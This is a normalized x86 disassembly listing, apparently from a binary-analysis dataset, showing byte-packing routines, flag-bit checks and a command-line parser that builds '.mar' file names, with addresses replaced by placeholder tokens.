mov ecx [ rwxdata ]
push ecx
call sub_40c21d
add esp 0x4
mov [ ebp - 0xc ] eax
mov edx [ ebp - 0xc ]
mov [ ebp - 0x20 ] edx
mov eax [ rwxdata ]
push eax
call sub_40c21d
add esp 0x4
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0xc ]
mov [ ebp - 0x30 ] ecx
mov edx [ rwxdata ]
push edx
call sub_40c21d
add esp 0x4
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x10 ] 0x0
mov ecx [ ebp - 0x3c ]
shl ecx 0x18
or ecx [ ebp - 0x10 ]
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0x20 ]
shl edx 0x10
or edx [ ebp - 0x10 ]
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0x30 ]
shl eax 0x8
or eax [ ebp - 0x10 ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0x10 ]
or ecx [ ebp - 0x28 ]
mov [ ebp - 0x10 ] ecx
mov edx [ rwxdata ]
push edx
call sub_40c21d
add esp 0x4
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x3c ] eax
mov ecx [ rwxdata ]
push ecx
call sub_40c21d
add esp 0x4
mov [ ebp - 0xc ] eax
mov edx [ ebp - 0xc ]
mov [ ebp - 0x20 ] edx
mov eax [ rwxdata ]
push eax
call sub_40c21d
add esp 0x4
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0xc ]
mov [ ebp - 0x30 ] ecx
mov edx [ rwxdata ]
push edx
call sub_40c21d
add esp 0x4
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] 0x0
mov ecx [ ebp - 0x3c ]
shl ecx 0x18
or ecx [ ebp - 0x24 ]
mov [ ebp - 0x24 ] ecx
mov edx [ ebp - 0x20 ]
shl edx 0x10
or edx [ ebp - 0x24 ]
mov [ ebp - 0x24 ] edx
mov eax [ ebp - 0x30 ]
shl eax 0x8
or eax [ ebp - 0x24 ]
mov [ ebp - 0x24 ] eax
mov ecx [ ebp - 0x24 ]
or ecx [ ebp - 0x28 ]
mov [ ebp - 0x24 ] ecx
mov edx [ rwxdata ]
push edx
call sub_40c21d
add esp 0x4
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x3c ] eax
mov ecx [ rwxdata ]
push ecx
call sub_40c21d
add esp 0x4
mov [ ebp - 0xc ] eax
mov edx [ ebp - 0xc ]
mov [ ebp - 0x20 ] edx
mov eax [ rwxdata ]
push eax
call sub_40c21d
add esp 0x4
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0xc ]
mov [ ebp - 0x30 ] ecx
mov edx [ rwxdata ]
push edx
call sub_40c21d
add esp 0x4
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x1c ] 0x0
mov ecx [ ebp - 0x3c ]
shl ecx 0x18
or ecx [ ebp - 0x1c ]
mov [ ebp - 0x1c ] ecx
mov edx [ ebp - 0x20 ]
shl edx 0x10
or edx [ ebp - 0x1c ]
mov [ ebp - 0x1c ] edx
mov eax [ ebp - 0x30 ]
shl eax 0x8
or eax [ ebp - 0x1c ]
mov [ ebp - 0x1c ] eax
mov ecx [ ebp - 0x1c ]
or ecx [ ebp - 0x28 ]
mov [ ebp - 0x1c ] ecx
mov edx [ rwxdata ]
push edx
call sub_40c21d
add esp 0x4
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x3c ] eax
mov ecx [ rwxdata ]
push ecx
call sub_40c21d
add esp 0x4
mov [ ebp - 0xc ] eax
mov edx [ ebp - 0xc ]
mov [ ebp - 0x20 ] edx
mov eax [ rwxdata ]
push eax
call sub_40c21d
add esp 0x4
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0xc ]
mov [ ebp - 0x30 ] ecx
mov edx [ rwxdata ]
push edx
call sub_40c21d
add esp 0x4
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x38 ] 0x0
mov ecx [ ebp - 0x3c ]
shl ecx 0x18
or ecx [ ebp - 0x38 ]
mov [ ebp - 0x38 ] ecx
mov edx [ ebp - 0x20 ]
shl edx 0x10
or edx [ ebp - 0x38 ]
mov [ ebp - 0x38 ] edx
mov eax [ ebp - 0x30 ]
shl eax 0x8
or eax [ ebp - 0x38 ]
mov [ ebp - 0x38 ] eax
mov ecx [ ebp - 0x38 ]
or ecx [ ebp - 0x28 ]
mov [ ebp - 0x38 ] ecx
mov edx [ rwxdata ]
push edx
call sub_40c21d
add esp 0x4
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x3c ] eax
mov ecx [ rwxdata ]
push ecx
call sub_40c21d
add esp 0x4
mov [ ebp - 0xc ] eax
mov edx [ ebp - 0xc ]
mov [ ebp - 0x20 ] edx
mov eax [ rwxdata ]
push eax
call sub_40c21d
add esp 0x4
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0xc ]
mov [ ebp - 0x30 ] ecx
mov edx [ rwxdata ]
push edx
call sub_40c21d
add esp 0x4
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x2c ] 0x0
mov ecx [ ebp - 0x3c ]
shl ecx 0x18
or ecx [ ebp - 0x2c ]
mov [ ebp - 0x2c ] ecx
mov edx [ ebp - 0x20 ]
shl edx 0x10
or edx [ ebp - 0x2c ]
mov [ ebp - 0x2c ] edx
mov eax [ ebp - 0x30 ]
shl eax 0x8
or eax [ ebp - 0x2c ]
mov [ ebp - 0x2c ] eax
mov ecx [ ebp - 0x2c ]
or ecx [ ebp - 0x28 ]
mov [ ebp - 0x2c ] ecx
mov edx [ rwxdata ]
push edx
call sub_40c21d
add esp 0x4
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x3c ] eax
mov ecx [ rwxdata ]
push ecx
call sub_40c21d
add esp 0x4
mov [ ebp - 0xc ] eax
mov edx [ ebp - 0xc ]
mov [ ebp - 0x20 ] edx
mov eax [ rwxdata ]
push eax
call sub_40c21d
add esp 0x4
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0xc ]
mov [ ebp - 0x30 ] ecx
mov edx [ rwxdata ]
push edx
call sub_40c21d
add esp 0x4
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x8 ] 0x0
mov ecx [ ebp - 0x3c ]
shl ecx 0x18
or ecx [ ebp - 0x8 ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0x20 ]
shl edx 0x10
or edx [ ebp - 0x8 ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x30 ]
shl eax 0x8
or eax [ ebp - 0x8 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x8 ]
or ecx [ ebp - 0x28 ]
mov [ ebp - 0x8 ] ecx
mov edx [ rwxdata ]
imul edx edx 0x18
mov eax [ ebp - 0x10 ]
mov [ edx + rwxdata ] eax
mov ecx [ rwxdata ]
imul ecx ecx 0x18
mov edx [ ebp - 0x1c ]
mov [ ecx + rwxdata ] edx
mov eax [ rwxdata ]
imul eax eax 0x18
mov ecx [ ebp - 0x2c ]
mov [ eax + rwxdata ] ecx
mov edx [ rwxdata ]
imul edx edx 0x18
mov eax [ ebp - 0x24 ]
mov [ edx + rwxdata ] eax
mov ecx [ rwxdata ]
imul ecx ecx 0x18
mov edx [ ebp - 0x38 ]
mov [ ecx + rwxdata ] edx
mov eax [ rwxdata ]
imul eax eax 0x18
mov ecx [ ebp - 0x8 ]
mov [ eax + rwxdata ] ecx
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
jmp r-xdata
mov ecx [ ebp - 0x18 ]
add ecx 0x1
mov [ ebp - 0x18 ] ecx
mov edx [ ebp - 0x18 ]
movzx eax [ edx + rwxdata ]
test eax eax
je r-xdata
mov eax [ ebp - 0x14 ]
or eax 0x4000
mov [ ebp - 0x14 ] eax
mov edx [ rwxdata ]
sub edx 0x1
cmp [ ebp - 0x18 ] edx
jge r-xdata
mov ecx [ rwxdata ]
push ecx
call sub_40b923
add esp 0x4
test eax eax
jne r-xdata
mov edx [ ebp - 0x18 ]
add edx 0x1
mov [ ebp - 0x18 ] edx
mov eax [ ebp - 0x18 ]
movzx ecx [ eax + rwxdata ]
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x14 ]
or ecx 0x2000
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x44 ] rwxdata
mov eax [ ebp - 0x44 ]
add eax 0x1
mov [ ebp - 0x48 ] eax
mov eax [ ebp - 0x18 ]
imul eax eax 0x18
mov ecx [ eax + rwxdata ]
push ecx
mov edx [ ebp - 0x18 ]
imul edx edx 0x18
mov eax [ edx + rwxdata ]
push eax
mov ecx [ ebp - 0x18 ]
imul ecx ecx 0x18
mov edx [ ecx + rwxdata ]
push edx
mov eax [ ebp - 0x18 ]
imul eax eax 0x18
mov ecx [ eax + rwxdata ]
push ecx
mov edx [ ebp - 0x18 ]
imul edx edx 0x18
mov eax [ edx + rwxdata ]
push eax
mov ecx [ ebp - 0x18 ]
imul ecx ecx 0x18
mov edx [ ecx + rwxdata ]
push edx
call sub_406e30
add esp 0x18
jmp r-xdata
mov eax [ ebp - 0x18 ]
add eax 0x1
mov [ ebp - 0x18 ] eax
mov ecx [ ebp - 0x18 ]
movzx edx [ ecx + rwxdata ]
test edx edx
je r-xdata
mov edx [ ebp - 0x14 ]
or edx 0x1000
mov [ ebp - 0x14 ] edx
mov ecx [ ebp - 0x44 ]
mov dl [ ecx ]
mov [ ebp - 0x49 ] dl
add [ ebp - 0x44 ] 0x1
cmp [ ebp - 0x49 ] 0x0
jne r-xdata
mov eax [ ebp - 0x44 ]
sub eax [ ebp - 0x48 ]
mov [ ebp - 0x50 ] eax
mov ecx [ ebp - 0x50 ]
push ecx
push rwxdata
push rwxdata
call sub_4011b0
add esp 0xc
xor eax eax
mov ecx [ ebp - 0x18 ]
add ecx 0x1
mov [ ebp - 0x18 ] ecx
mov ecx [ ebp - 0x18 ]
add ecx 0x1
mov [ ebp - 0x18 ] ecx
mov edx [ ebp - 0x18 ]
movzx eax [ edx + rwxdata ]
test eax eax
je r-xdata
mov eax [ ebp - 0x14 ]
or eax 0x800
mov [ ebp - 0x14 ] eax
mov edx [ ebp - 0x18 ]
add edx 0x1
mov [ ebp - 0x18 ] edx
mov eax [ ebp - 0x18 ]
movzx ecx [ eax + rwxdata ]
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x14 ]
or ecx 0x400
mov [ ebp - 0x14 ] ecx
mov eax [ ebp - 0x18 ]
add eax 0x1
mov [ ebp - 0x18 ] eax
mov ecx [ ebp - 0x18 ]
movzx edx [ ecx + rwxdata ]
test edx edx
je r-xdata
mov edx [ ebp - 0x14 ]
or edx 0x200
mov [ ebp - 0x14 ] edx
mov ecx [ ebp - 0x18 ]
add ecx 0x1
mov [ ebp - 0x18 ] ecx
mov edx [ ebp - 0x18 ]
movzx eax [ edx + rwxdata ]
test eax eax
je r-xdata
mov eax [ ebp - 0x14 ]
or eax 0x100
mov [ ebp - 0x14 ] eax
mov edx [ ebp - 0x18 ]
add edx 0x1
mov [ ebp - 0x18 ] edx
mov eax [ ebp - 0x18 ]
movzx ecx [ eax + rwxdata ]
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x14 ]
or ecx 0x80
mov [ ebp - 0x14 ] ecx
mov eax [ ebp - 0x18 ]
add eax 0x1
mov [ ebp - 0x18 ] eax
mov ecx [ ebp - 0x18 ]
movzx edx [ ecx + rwxdata ]
test edx edx
je r-xdata
mov edx [ ebp - 0x14 ]
or edx 0x40
mov [ ebp - 0x14 ] edx
mov ecx [ ebp - 0x18 ]
add ecx 0x1
mov [ ebp - 0x18 ] ecx
mov edx [ ebp - 0x18 ]
movzx eax [ edx + rwxdata ]
test eax eax
je r-xdata
mov eax [ ebp - 0x14 ]
or eax 0x20
mov [ ebp - 0x14 ] eax
mov edx [ ebp - 0x18 ]
add edx 0x1
mov [ ebp - 0x18 ] edx
mov eax [ ebp - 0x18 ]
movzx ecx [ eax + rwxdata ]
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x14 ]
or ecx 0x10
mov [ ebp - 0x14 ] ecx
mov eax [ ebp - 0x18 ]
add eax 0x1
mov [ ebp - 0x18 ] eax
mov ecx [ ebp - 0x18 ]
movzx edx [ ecx + rwxdata ]
test edx edx
je r-xdata
mov edx [ ebp - 0x14 ]
or edx 0x8
mov [ ebp - 0x14 ] edx
mov ecx [ ebp - 0x18 ]
add ecx 0x1
mov [ ebp - 0x18 ] ecx
mov edx [ ebp - 0x18 ]
movzx eax [ edx + rwxdata ]
test eax eax
je r-xdata
mov eax [ ebp - 0x14 ]
or eax 0x4
mov [ ebp - 0x14 ] eax
mov edx [ ebp - 0x18 ]
add edx 0x1
mov [ ebp - 0x18 ] edx
mov eax [ ebp - 0x18 ]
movzx ecx [ eax + rwxdata ]
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x14 ]
or ecx 0x2
mov [ ebp - 0x14 ] ecx
mov eax [ ebp - 0x18 ]
add eax 0x1
mov [ ebp - 0x18 ] eax
mov ecx [ rwxdata ]
mov edx [ ebp - 0x14 ]
mov [ ecx * 4 + rwxdata ] edx
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
jmp r-xdata
mov edx [ ebp - 0x14 ]
or edx 0x1
mov [ ebp - 0x14 ] edx
mov edx [ ebp - 0x18 ]
cmp edx [ rwxdata ]
jge r-xdata
sub_409590
push ebp
mov ebp esp
sub esp 0x3d8
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x10c ] 0x0
jmp r-xdata
cmp [ ebp - 0x10c ] 0xff
jge r-xdata
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x21c ] edx
cmp [ ebp + 0x8 ] 0x1
jne r-xdata
mov ecx [ ebp - 0x10c ]
mov [ ebp + ecx - 0x108 ] 0x0
jmp r-xdata
mov [ ebp - 0x10c ] 0x1
jmp r-xdata
mov eax [ ebp - 0x21c ]
add eax 0x2
mov [ ebp - 0x21c ] eax
push 0xc
call sub_40c3fc
add esp 0x4
mov [ ebp - 0x228 ] eax
mov ecx [ ebp - 0x228 ]
mov [ ebp + 0xc ] ecx
mov edx [ ebp + 0xc ]
mov [ edx + 0x4 ] r--data
mov eax [ ebp + 0xc ]
mov [ eax + 0x8 ] r--data
mov eax [ ebp - 0x10c ]
add eax 0x1
mov [ ebp - 0x10c ] eax
mov edx [ ebp - 0x10c ]
cmp edx [ ebp - 0x21c ]
jge r-xdata
xor eax eax
mov eax [ ebp - 0x10c ]
mov ecx [ ebp + 0xc ]
mov edx [ ecx + eax * 4 ]
mov [ ebp - 0x22c ] edx
mov eax [ ebp - 0x22c ]
add eax 0x1
mov [ ebp - 0x230 ] eax
mov ecx [ ebp - 0x22c ]
mov dl [ ecx ]
mov [ ebp - 0x231 ] dl
add [ ebp - 0x22c ] 0x1
cmp [ ebp - 0x231 ] 0x0
jne r-xdata
mov eax [ ebp - 0x22c ]
sub eax [ ebp - 0x230 ]
mov [ ebp - 0x238 ] eax
je r-xdata
jmp r-xdata
mov ecx [ ebp - 0x10c ]
mov edx [ ebp + 0xc ]
mov eax [ edx + ecx * 4 ]
mov [ ebp - 0x23c ] eax
lea ecx [ ebp - 0x108 ]
mov [ ebp - 0x240 ] ecx
mov edx [ ebp - 0x240 ]
mov [ ebp - 0x244 ] edx
mov ecx [ ebp - 0x10c ]
add ecx 0x1
mov [ ebp - 0x10c ] ecx
mov eax [ ebp - 0x23c ]
mov cl [ eax ]
mov [ ebp - 0x245 ] cl
mov edx [ ebp - 0x240 ]
mov al [ ebp - 0x245 ]
mov [ edx ] al
mov ecx [ ebp - 0x23c ]
add ecx 0x1
mov [ ebp - 0x23c ] ecx
mov edx [ ebp - 0x240 ]
add edx 0x1
mov [ ebp - 0x240 ] edx
cmp [ ebp - 0x245 ] 0x0
jne r-xdata
movsx eax [ ebp - 0x108 ]
cmp eax 0x2d
jne r-xdata
lea ecx [ ebp - 0x108 ]
mov [ ebp - 0x24c ] ecx
mov edx [ ebp - 0x24c ]
add edx 0x1
mov [ ebp - 0x250 ] edx
mov eax [ ebp - 0x24c ]
mov cl [ eax ]
mov [ ebp - 0x251 ] cl
add [ ebp - 0x24c ] 0x1
cmp [ ebp - 0x251 ] 0x0
jne r-xdata
mov edx [ ebp - 0x24c ]
sub edx [ ebp - 0x250 ]
mov [ ebp - 0x258 ] edx
cmp [ ebp - 0x258 ] 0x2
jne r-xdata
movsx eax [ ebp - 0x107 ]
cmp eax 0x63
jne r-xdata
movsx edx [ ebp - 0x107 ]
cmp edx 0x64
jne r-xdata
mov ecx [ ebp - 0x10c ]
add ecx 0x1
cmp [ ebp - 0x21c ] ecx
jle r-xdata
movsx ecx [ ebp - 0x107 ]
cmp ecx 0x68
jne r-xdata
mov eax [ ebp - 0x10c ]
add eax 0x1
cmp [ ebp - 0x21c ] eax
jle r-xdata
jmp r-xdata
mov edx [ ebp - 0x10c ]
mov eax [ ebp + 0xc ]
mov ecx [ eax + edx * 4 + 0x4 ]
mov [ ebp - 0x25c ] ecx
mov edx [ ebp - 0x25c ]
add edx 0x1
mov [ ebp - 0x260 ] edx
movsx edx [ ebp - 0x107 ]
cmp edx 0x6c
je r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0x10c ]
mov edx [ ebp + 0xc ]
mov eax [ edx + ecx * 4 + 0x4 ]
mov [ ebp - 0x31c ] eax
mov ecx [ ebp - 0x31c ]
add ecx 0x1
mov [ ebp - 0x320 ] ecx
mov eax [ ebp - 0x25c ]
mov cl [ eax ]
mov [ ebp - 0x261 ] cl
add [ ebp - 0x25c ] 0x1
cmp [ ebp - 0x261 ] 0x0
jne r-xdata
mov edx [ ebp - 0x25c ]
sub edx [ ebp - 0x260 ]
mov [ ebp - 0x268 ] edx
je r-xdata
jmp r-xdata
movsx eax [ ebp - 0x107 ]
cmp eax 0x65
jne r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40b762
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x31c ]
mov al [ edx ]
mov [ ebp - 0x321 ] al
add [ ebp - 0x31c ] 0x1
cmp [ ebp - 0x321 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x31c ]
sub ecx [ ebp - 0x320 ]
mov [ ebp - 0x328 ] ecx
je r-xdata
mov eax [ ebp - 0x10c ]
mov ecx [ ebp + 0xc ]
mov edx [ ecx + eax * 4 + 0x4 ]
mov [ ebp - 0x26c ] edx
mov [ ebp - 0x270 ] rwxdata
mov eax [ ebp - 0x270 ]
mov [ ebp - 0x274 ] eax
mov edx [ ebp - 0x10c ]
mov eax [ ebp + 0xc ]
mov ecx [ eax + edx * 4 + 0x4 ]
mov [ ebp - 0x32c ] ecx
mov [ ebp - 0x330 ] rwxdata
mov edx [ ebp - 0x330 ]
mov [ ebp - 0x334 ] edx
mov ecx [ ebp - 0x26c ]
mov dl [ ecx ]
mov [ ebp - 0x275 ] dl
mov eax [ ebp - 0x270 ]
mov cl [ ebp - 0x275 ]
mov [ eax ] cl
mov edx [ ebp - 0x26c ]
add edx 0x1
mov [ ebp - 0x26c ] edx
mov eax [ ebp - 0x270 ]
add eax 0x1
mov [ ebp - 0x270 ] eax
cmp [ ebp - 0x275 ] 0x0
jne r-xdata
mov [ ebp - 0x224 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x32c ]
mov cl [ eax ]
mov [ ebp - 0x335 ] cl
mov edx [ ebp - 0x330 ]
mov al [ ebp - 0x335 ]
mov [ edx ] al
mov ecx [ ebp - 0x32c ]
add ecx 0x1
mov [ ebp - 0x32c ] ecx
mov edx [ ebp - 0x330 ]
add edx 0x1
mov [ ebp - 0x330 ] edx
cmp [ ebp - 0x335 ] 0x0
jne r-xdata
mov [ ebp - 0x224 ] 0x0
jmp r-xdata
cmp [ ebp - 0x224 ] 0xff
jge r-xdata
cmp [ ebp - 0x224 ] 0xff
jge r-xdata
mov eax [ ebp - 0x10c ]
mov ecx [ ebp + 0xc ]
mov edx [ ecx + eax * 4 + 0x4 ]
mov [ ebp - 0x27c ] edx
lea eax [ ebp - 0x210 ]
mov [ ebp - 0x280 ] eax
mov ecx [ ebp - 0x280 ]
mov [ ebp - 0x284 ] ecx
mov edx [ ebp - 0x224 ]
mov [ ebp + edx - 0x210 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x10c ]
mov eax [ ebp + 0xc ]
mov ecx [ eax + edx * 4 + 0x4 ]
mov [ ebp - 0x33c ] ecx
lea edx [ ebp - 0x210 ]
mov [ ebp - 0x340 ] edx
mov eax [ ebp - 0x340 ]
mov [ ebp - 0x344 ] eax
mov ecx [ ebp - 0x224 ]
mov [ ebp + ecx - 0x210 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x27c ]
mov al [ edx ]
mov [ ebp - 0x285 ] al
mov ecx [ ebp - 0x280 ]
mov dl [ ebp - 0x285 ]
mov [ ecx ] dl
mov eax [ ebp - 0x27c ]
add eax 0x1
mov [ ebp - 0x27c ] eax
mov ecx [ ebp - 0x280 ]
add ecx 0x1
mov [ ebp - 0x280 ] ecx
cmp [ ebp - 0x285 ] 0x0
jne r-xdata
mov [ ebp - 0x218 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x224 ]
add ecx 0x1
mov [ ebp - 0x224 ] ecx
mov ecx [ ebp - 0x33c ]
mov dl [ ecx ]
mov [ ebp - 0x345 ] dl
mov eax [ ebp - 0x340 ]
mov cl [ ebp - 0x345 ]
mov [ eax ] cl
mov edx [ ebp - 0x33c ]
add edx 0x1
mov [ ebp - 0x33c ] edx
mov eax [ ebp - 0x340 ]
add eax 0x1
mov [ ebp - 0x340 ] eax
cmp [ ebp - 0x345 ] 0x0
jne r-xdata
mov [ ebp - 0x218 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x224 ]
add eax 0x1
mov [ ebp - 0x224 ] eax
mov eax [ ebp - 0x218 ]
movsx ecx [ ebp + eax - 0x210 ]
cmp ecx 0x2e
je r-xdata
mov edx [ ebp - 0x218 ]
movsx eax [ ebp + edx - 0x210 ]
cmp eax 0x2e
je r-xdata
mov [ ebp - 0x220 ] 0x0
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x220 ] 0x0
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x220 ]
movsx ecx [ eax + rwxdata ]
cmp ecx 0x2e
je r-xdata
mov edx [ ebp - 0x218 ]
add edx 0x1
mov [ ebp - 0x218 ] edx
mov edx [ ebp - 0x220 ]
movsx eax [ edx + rwxdata ]
cmp eax 0x2e
je r-xdata
mov ecx [ ebp - 0x218 ]
add ecx 0x1
mov [ ebp - 0x218 ] ecx
mov edx [ ebp - 0x218 ]
mov [ ebp + edx - 0x210 ] 0x5f
mov eax [ ebp - 0x218 ]
add eax 0x1
mov [ ebp - 0x218 ] eax
mov ecx [ ebp - 0x218 ]
mov [ ebp - 0x214 ] ecx
jmp r-xdata
jmp r-xdata
mov ecx [ ebp - 0x218 ]
mov [ ebp + ecx - 0x210 ] 0x5f
mov edx [ ebp - 0x218 ]
add edx 0x1
mov [ ebp - 0x218 ] edx
mov eax [ ebp - 0x218 ]
mov [ ebp - 0x214 ] eax
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x218 ]
add eax [ ebp - 0x220 ]
cmp [ ebp - 0x214 ] eax
jge r-xdata
mov edx [ ebp - 0x220 ]
add edx 0x1
mov [ ebp - 0x220 ] edx
mov edx [ ebp - 0x218 ]
add edx [ ebp - 0x220 ]
cmp [ ebp - 0x214 ] edx
jge r-xdata
mov ecx [ ebp - 0x220 ]
add ecx 0x1
mov [ ebp - 0x220 ] ecx
mov ecx [ ebp - 0x214 ]
mov [ ebp + ecx - 0x210 ] 0x2e
mov edx [ ebp - 0x214 ]
add edx 0x1
mov [ ebp - 0x214 ] edx
mov eax [ ebp - 0x214 ]
mov [ ebp + eax - 0x210 ] 0x6d
mov ecx [ ebp - 0x214 ]
add ecx 0x1
mov [ ebp - 0x214 ] ecx
mov edx [ ebp - 0x214 ]
mov [ ebp + edx - 0x210 ] 0x61
mov eax [ ebp - 0x214 ]
add eax 0x1
mov [ ebp - 0x214 ] eax
mov ecx [ ebp - 0x214 ]
mov [ ebp + ecx - 0x210 ] 0x72
mov [ ebp - 0x214 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x214 ]
sub ecx [ ebp - 0x218 ]
mov edx [ ebp - 0x214 ]
mov al [ ecx + rwxdata ]
mov [ ebp + edx - 0x210 ] al
jmp r-xdata
mov eax [ ebp - 0x214 ]
mov [ ebp + eax - 0x210 ] 0x2e
mov ecx [ ebp - 0x214 ]
add ecx 0x1
mov [ ebp - 0x214 ] ecx
mov edx [ ebp - 0x214 ]
mov [ ebp + edx - 0x210 ] 0x6d
mov eax [ ebp - 0x214 ]
add eax 0x1
mov [ ebp - 0x214 ] eax
mov ecx [ ebp - 0x214 ]
mov [ ebp + ecx - 0x210 ] 0x61
mov edx [ ebp - 0x214 ]
add edx 0x1
mov [ ebp - 0x214 ] edx
mov eax [ ebp - 0x214 ]
mov [ ebp + eax - 0x210 ] 0x72
mov [ ebp - 0x214 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x214 ]
sub eax [ ebp - 0x218 ]
mov ecx [ ebp - 0x214 ]
mov dl [ eax + rwxdata ]
mov [ ebp + ecx - 0x210 ] dl
jmp r-xdata
lea eax [ ebp - 0x210 ]
mov [ ebp - 0x28c ] eax
mov ecx [ ebp - 0x28c ]
add ecx 0x1
mov [ ebp - 0x290 ] ecx
mov edx [ ebp - 0x214 ]
add edx 0x1
mov [ ebp - 0x214 ] edx
lea edx [ ebp - 0x210 ]
mov [ ebp - 0x34c ] edx
mov eax [ ebp - 0x34c ]
add eax 0x1
mov [ ebp - 0x350 ] eax
mov ecx [ ebp - 0x214 ]
add ecx 0x1
mov [ ebp - 0x214 ] ecx
mov edx [ ebp - 0x28c ]
mov al [ edx ]
mov [ ebp - 0x291 ] al
add [ ebp - 0x28c ] 0x1
cmp [ ebp - 0x291 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x28c ]
sub ecx [ ebp - 0x290 ]
mov [ ebp - 0x298 ] ecx
mov edx [ ebp - 0x214 ]
cmp edx [ ebp - 0x298 ]
jae r-xdata
mov ecx [ ebp - 0x34c ]
mov dl [ ecx ]
mov [ ebp - 0x351 ] dl
add [ ebp - 0x34c ] 0x1
cmp [ ebp - 0x351 ] 0x0
jne r-xdata
mov eax [ ebp - 0x34c ]
sub eax [ ebp - 0x350 ]
mov [ ebp - 0x358 ] eax
mov ecx [ ebp - 0x214 ]
cmp ecx [ ebp - 0x358 ]
jae r-xdata
mov [ ebp - 0x224 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x214 ]
mov ecx [ ebp - 0x214 ]
mov dl [ ebp + ecx - 0x210 ]
mov [ eax + rwxdata ] dl
jmp r-xdata
mov [ ebp - 0x224 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x214 ]
mov eax [ ebp - 0x214 ]
mov cl [ ebp + eax - 0x210 ]
mov [ edx + rwxdata ] cl
jmp r-xdata
cmp [ ebp - 0x224 ] 0xff
jge r-xdata
mov edx [ ebp - 0x214 ]
add edx 0x1
mov [ ebp - 0x214 ] edx
cmp [ ebp - 0x224 ] 0xff
jge r-xdata
mov ecx [ ebp - 0x214 ]
add ecx 0x1
mov [ ebp - 0x214 ] ecx
mov edx [ ebp - 0x10c ]
mov eax [ ebp + 0xc ]
mov ecx [ eax + edx * 4 + 0x4 ]
mov [ ebp - 0x29c ] ecx
lea edx [ ebp - 0x210 ]
mov [ ebp - 0x2a0 ] edx
mov eax [ ebp - 0x2a0 ]
mov [ ebp - 0x2a4 ] eax
mov ecx [ ebp - 0x224 ]
mov [ ebp + ecx - 0x210 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x10c ]
mov edx [ ebp + 0xc ]
mov eax [ edx + ecx * 4 + 0x4 ]
mov [ ebp - 0x35c ] eax
lea ecx [ ebp - 0x210 ]
mov [ ebp - 0x360 ] ecx
mov edx [ ebp - 0x360 ]
mov [ ebp - 0x364 ] edx
mov eax [ ebp - 0x224 ]
mov [ ebp + eax - 0x210 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x29c ]
mov dl [ ecx ]
mov [ ebp - 0x2a5 ] dl
mov eax [ ebp - 0x2a0 ]
mov cl [ ebp - 0x2a5 ]
mov [ eax ] cl
mov edx [ ebp - 0x29c ]
add edx 0x1
mov [ ebp - 0x29c ] edx
mov eax [ ebp - 0x2a0 ]
add eax 0x1
mov [ ebp - 0x2a0 ] eax
cmp [ ebp - 0x2a5 ] 0x0
jne r-xdata
mov [ ebp - 0x218 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x224 ]
add eax 0x1
mov [ ebp - 0x224 ] eax
mov eax [ ebp - 0x35c ]
mov cl [ eax ]
mov [ ebp - 0x365 ] cl
mov edx [ ebp - 0x360 ]
mov al [ ebp - 0x365 ]
mov [ edx ] al
mov ecx [ ebp - 0x35c ]
add ecx 0x1
mov [ ebp - 0x35c ] ecx
mov edx [ ebp - 0x360 ]
add edx 0x1
mov [ ebp - 0x360 ] edx
